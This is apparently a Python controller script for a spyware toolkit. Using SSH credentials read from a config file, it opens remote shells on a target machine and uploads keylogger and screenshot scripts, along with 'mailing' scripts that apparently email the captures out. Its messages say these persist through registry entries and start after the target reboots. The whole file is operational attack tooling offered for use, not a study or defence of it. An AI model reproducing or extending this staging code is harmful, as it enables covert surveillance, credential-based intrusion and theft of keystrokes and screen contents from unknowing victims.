import os
import sys
from modules import *
import re
import paramiko

header = """


           .---.            ,--,                                ____
          /. ./|          ,--.'|                              ,'  , `.
      .--'.  ' ;          |  | :               ,---.       ,-+-,.' _ |
     /__./ \ : |          :  : '              '   ,'\   ,-+-. ;   , ||
 .--'.  '   \' .   ,---.  |  ' |      ,---.  /   /   | ,--.'|'   |  || ,---.
/___/ \ |    ' '  /     \ '  | |     /     \.   ; ,. :|   |  ,', |  |,/     \
;   \  \;      : /    /  ||  | :    /    / ''   | |: :|   | /  | |--'/    /  |
 \   ;  `      |.    ' / |'  : |__ .    ' / '   | .; :|   : |  | ,  .    ' / |
  .   \    .\  ;'   ;   /||  | '.'|'   ; :__|   :    ||   : |  |/   '   ;   /|
   \   \   ' \ |'   |  / |;  :    ;'   | '.'|\   \  / |   | |`-'    '   |  / |
    :   '  |--" |   :    ||  ,   / |   :    : `----'  |   ;/        |   :    |
     \   \ ;     \   \  /  ---`-'   \   \  /          '---'          \   \  /
      '---"       `----'             `----'                           `----'


"""

init_menu = """
    Please select the following options:

    Options:
        [0] Remote access
        [1] Implant keylogger to target host
        [2] Implant screenshoting tool to target host
        [3] Exit
"""

alt_menu = """
  #####                                                        #####
 #     # ##### # #      #         #    # ###### #####  ###### #     #
 #         #   # #      #         #    # #      #    # #            #
  #####    #   # #      #         ###### #####  #    # #####     ###
       #   #   # #      #         #    # #      #####  #         #
 #     #   #   # #      #         #    # #      #   #  #
  #####    #   # ###### ######    #    # ###### #    # ######    #


    Options:
        [0] Remote access
        [1] Implant keylogger to target host
        [2] Implant screenshoting tool to target host
        [3] Exit
"""

yes_no = """
    Options:
        [Y] Yup
        [N] Nope
"""

goodbye = """
  _______   ______     ______    _______  .______   ____    ____  _______
 /  _____| /  __  \   /  __  \  |       \ |   _  \  \   \  /   / |   ____|
|  |  __  |  |  |  | |  |  |  | |  .--.  ||  |_)  |  \   \/   /  |  |__
|  | |_ | |  |  |  | |  |  |  | |  |  |  ||   _  <    \_    _/   |   __|
|  |__| | |  `--'  | |  `--'  | |  '--'  ||  |_)  |     |  |     |  |____
 \______|  \______/   \______/  |_______/ |______/      |__|     |_______|

"""

key_stage_logo = """

    888 88P                   888
    888 8P   ,e e,  Y8b Y888P 888  e88 88e   e88 888  e88 888  ,e e,  888,8,
    888 K   d88 88b  Y8b Y8P  888 d888 888b d888 888 d888 888 d88 88b 888 "
    888 8b  888   ,   Y8b Y   888 Y888 888P Y888 888 Y888 888 888   , 888
    888 88b  "YeeP"    888    888  "88 88"   "88 888  "88 888  "YeeP" 888
                       888                    ,  88P   ,  88P
                       888                   "8",P"   "8",P"

"""


scr_stage_logo = """

    ░█▀▀░█▀▀░█▀▄░█▀▀░█▀▀░█▀█░█▀▀░█░█░█▀█░▀█▀░█▀▀
    ░▀▀█░█░░░█▀▄░█▀▀░█▀▀░█░█░▀▀█░█▀█░█░█░░█░░▀▀█
    ░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀░▀▀▀░░▀░░▀▀▀

"""

def scr_stage():
    conf = cfg_func(sys.argv[1])

    work_dir = conf.get("work_dir")
    passw = conf.get("pass")
    user = conf.get("admin_user")
    addr = conf.get("addr")
    target = conf.get("target")

    # duh
    script_dir = os.path.dirname(os.path.abspath(__file__))
    relative_file_path = "tools/screen/scr.ps1"
    file_to_transfer = os.path.join(script_dir, relative_file_path)
    destination_path = fr"C:\Users\{target}\AppData\Local\Temp\{work_dir}\scr.ps1"

    print("Uploading screenshoting script...")
    file_upload(file_to_transfer, destination_path, passw, user, addr)

    script_dir = os.path.dirname(os.path.abspath(__file__))
    relative_file_path = "tools/screen/scr.vbs"
    file_to_transfer = os.path.join(script_dir, relative_file_path)
    destination_path = fr"C:\Users\{target}\AppData\Local\Temp\{work_dir}\scr.vbs"

    print("Uploading VBS script for screenshoter...")
    file_upload(file_to_transfer, destination_path, passw, user, addr)

    script_dir = os.path.dirname(os.path.abspath(__file__))
    relative_file_path = "tools/screen/scre.ps1"
    file_to_transfer = os.path.join(script_dir, relative_file_path)
    destination_path = fr"C:\Users\{target}\AppData\Local\Temp\{work_dir}\scre.ps1"

    print("Uploading mailing script for screenshots...")
    file_upload(file_to_transfer, destination_path, passw, user, addr)

    script_dir = os.path.dirname(os.path.abspath(__file__))
    relative_file_path = "tools/screen/scre.vbs"
    file_to_transfer = os.path.join(script_dir, relative_file_path)
    destination_path = fr"C:\Users\{target}\AppData\Local\Temp\{work_dir}\scre.vbs"

    print("Uploading VBS script for screenshot mails...")
    file_upload(file_to_transfer, destination_path, passw, user, addr)

    print("Get some good shots")


def key_stage():
    conf = cfg_func(sys.argv[1])

    work_dir = conf.get("work_dir")
    passw = conf.get("pass")
    user = conf.get("admin_user")
    addr = conf.get("addr")
    target = conf.get("target")

    # For keylog staging
    script_dir = os.path.dirname(os.path.abspath(__file__))
    relative_file_path = "tools/keylog/k.ps1"
    file_to_transfer = os.path.join(script_dir, relative_file_path)
    destination_path = fr"C:\Users\{target}\AppData\Local\Temp\{work_dir}\k.ps1"

    print("Uploading keylogger...")
    file_upload(file_to_transfer, destination_path, passw, user, addr)

    script_dir = os.path.dirname(os.path.abspath(__file__))
    relative_file_path = "tools/keylog/k.vbs"
    file_to_transfer = os.path.join(script_dir, relative_file_path)
    destination_path = fr"C:\Users\{target}\AppData\Local\Temp\{work_dir}\k.vbs"

    print("Uploading VBS script for keylogger...")
    file_upload(file_to_transfer, destination_path, passw, user, addr)

    script_dir = os.path.dirname(os.path.abspath(__file__))
    relative_file_path = "tools/keylog/ke.ps1"
    file_to_transfer = os.path.join(script_dir, relative_file_path)
    destination_path = fr"C:\Users\{target}\AppData\Local\Temp\{work_dir}\ke.ps1"

    print("Uploading mailing script for keylogger...")
    file_upload(file_to_transfer, destination_path, passw, user, addr)

    script_dir = os.path.dirname(os.path.abspath(__file__))
    relative_file_path = "tools/keylog/ke.vbs"
    file_to_transfer = os.path.join(script_dir, relative_file_path)
    destination_path = fr"C:\Users\{target}\AppData\Local\Temp\{work_dir}\ke.vbs"

    print("Uploading VBS script for keylogger mail...")
    file_upload(file_to_transfer, destination_path, passw, user, addr)

    print("Good to go")




def file_upload(file_to_transfer, destination_path, passw, user, addr):

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:

        client.connect(addr, port=22, username=user, password=passw)

        sftp = client.open_sftp()

        sftp.put(file_to_transfer, destination_path)

        sftp.close()
        client.close()

        print("File transferred successfully.")

    except Exception as e:

        print(f"An error occurred: {e}")


def remote():
    conf = cfg_func(sys.argv[1])

    password = conf.get("pass")
    user = conf.get("admin_user")
    addr = conf.get("addr")

    # Connect
    os.system(f"sshpass -p \"{password}\" ssh {user}@{addr} -y")


def arguments():
    # See if arguments were provided
    try:
        sys.argv[1]
    except:
        print("Please provide some file as argument")
        return False

    # Check the appropriate format
    if not re.match(r"^.*\.(cfg)$", sys.argv[1]):
        print("Please provide .cfg format")
        return False

    # Check if .cfg file exists
    try:
        conf = cfg_func(sys.argv[1])
    except:
        print(".cfg file doesn't exist")
        return False

    return True


def detect_os():
    if os.name == "posix":
        return "linux"
    else:
        return "win"


# Read .cfg
def cfg_func(cfg_file):
    conf = {}
    f = open(cfg_file, "r")

    conf["addr"] = f.readline().strip()
    conf["admin_user"] = f.readline().strip()
    conf["pass"] = f.readline().strip()
    conf["work_dir"] = f.readline().strip()
    conf["target"] = cfg_file.rsplit('.cfg', 1)[0]

    return conf


# for console
def main():

    #Check for arguments
    if arguments():
            if detect_os() == "linux":
                os.system("clear")
                print(header)
                print(init_menu)
                prompt = int(input(f"Your choice: "))

                # for options
                while prompt != 3:
                    if prompt == 0:
                        remote()
                        print(alt_menu)
                        prompt = int(input(f"Your choice: "))

                    if prompt == 1:
                        os.system("clear")
                        print(key_stage_logo)
                        print("Be advised: keylogger will be activated ONLY after target reboot (due to registry entries). Still want to proceed?")
                        print(yes_no)
                        char_ans = input(f"Your choice: ")
                        if char_ans == 'Y':
                            key_stage()
                        if char_ans == 'N':
                            print(alt_menu)
                            prompt = int(input(f"Your choice: "))
                            continue

                        print(alt_menu)
                        prompt = int(input(f"Your choice: "))

                    if prompt == 2:
                         os.system("clear")
                         print(scr_stage_logo)
                         print("Be advised: screenshot tool will start only after next target reboot, proceed?")
                         print(yes_no)
                         char_ans = input(f"Your choice: ")
                         if char_ans == 'Y':
                             scr_stage()
                         if char_ans == 'N':
                             print(alt_menu)
                             prompt = int(input(f"Your choice: "))
                             continue

                         print(alt_menu)
                         prompt = int(input(f"Your choice: "))

                    # handling wrong prompts
                    elif prompt < 0 and prompt > 3:
                            os.system("clear")
                            print(alt_menu)
                            prompt = int(input(f"Your choice: "))

            # elif detect_os() == "win":
            #     os.system("cls")
            #     print(header)
            #     print(init_menu)
            #     prompt = int(input(f"Your choice: "))
            #
            #     # for options
            #     while prompt != 1:
            #         os.system("cls")
            #         print(alt_menu)
            #         prompt = int(input(f"Your choice: "))


            print(goodbye)

# If not imported
if __name__ == '__main__':
    main()
